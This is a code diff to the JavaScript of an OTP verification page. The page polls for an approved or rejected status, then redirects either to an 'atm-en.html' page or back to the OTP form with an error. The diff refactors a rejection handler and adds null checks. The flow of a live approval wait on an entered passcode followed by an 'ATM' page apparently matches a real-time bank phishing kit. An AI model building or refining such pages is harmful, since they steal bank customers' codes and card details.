@@ -377,18 +377,9 @@
 
     function redirectToAtm(){
       stopPoll();
-      waitOverlay.classList.remove('show');
+      if (waitOverlay) waitOverlay.classList.remove('show');
       if (requestId) {
         window.location.href = 'atm-en.html?id=' + requestId;
-      }
-    }
-
-    function redirectToOtpWithError(message){
-      stopPoll();
-      waitOverlay.classList.remove('show');
-      var finalMessage = message || 'The OTP was rejected. Please check the code and try again.';
-      if (requestId) {
-        window.location.href = 'otp-en.html?error=otp&msg=' + encodeURIComponent(finalMessage) + '&id=' + requestId;
       }
     }
 
@@ -403,7 +394,14 @@
             if (isApprovedStatus(status)) {
               redirectToAtm();
             } else if (isRejectedStatus(status)) {
-              redirectToOtpWithError('The OTP was rejected. Please check the code and try again.');
+              stopPoll();
+              if (waitOverlay) waitOverlay.classList.remove('show');
+              if (rejectOverlay) rejectOverlay.classList.add('show');
+              if (otpForm) otpForm.style.display = 'block';
+              if (otpInput) otpInput.disabled = false;
+              if (verifyBtn) verifyBtn.disabled = false;
+              var msg = 'The OTP was rejected. Please check the code and try again.';
+              window.location.href = 'otp-en.html?error=otp&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
             }
           })
           .catch(function(err){
